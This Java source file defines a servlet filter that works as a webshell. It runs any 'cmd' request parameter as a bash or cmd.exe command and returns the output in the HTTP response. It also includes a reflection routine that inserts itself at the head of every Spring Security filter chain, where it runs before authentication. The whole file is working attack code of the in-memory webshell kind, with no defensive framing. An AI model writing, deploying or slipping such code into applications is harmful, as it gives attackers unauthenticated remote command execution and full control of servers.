package org.test;


import org.springframework.security.web.FilterChainProxy;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.context.WebApplicationContext;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.List;

public class CustomFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("CustomFilter is called before security filters");
        if (request.getParameter("cmd") != null) {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/bash", "-c", "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin && " + request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                Process process = Runtime.getRuntime().exec(cmds);
                StringBuilder output = new StringBuilder();
                // 读取标准输出流
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    output.append(s).append("\n");
                }

                // 读取标准错误流
                BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                while ((s = stdError.readLine()) != null) {
                    output.append(s).append("\n");
                }

                // 等待命令执行完成
                int exitVal = process.waitFor();
                if (exitVal == 0) {
                    System.out.println("Command executed successfully.");
                } else {
                    System.out.println("Command execution failed with exit value: " + exitVal);
                }

                System.out.println("Output:\n" + output.toString());
                response.getWriter().println(output);
                System.out.println(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }


    @Override
    public void destroy() {
        // 销毁逻辑
    }

    // 通过反射插入自定义过滤器
    public static void addCustomFilter(WebApplicationContext context) {
        try {
            // 获取 FilterChainProxy 实例
            FilterChainProxy filterChainProxy = context.getBean(FilterChainProxy.class);
            Field field = FilterChainProxy.class.getDeclaredField("filterChains");
            field.setAccessible(true);

            // 获取 filterChains
            List<SecurityFilterChain> filterChains = (List<SecurityFilterChain>) field.get(filterChainProxy);

            // 插入自定义过滤器
            for (SecurityFilterChain chain : filterChains) {
                List<Filter> filters = chain.getFilters();
                filters.add(0, new CustomFilter()); // 插入到过滤器链的最前面
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
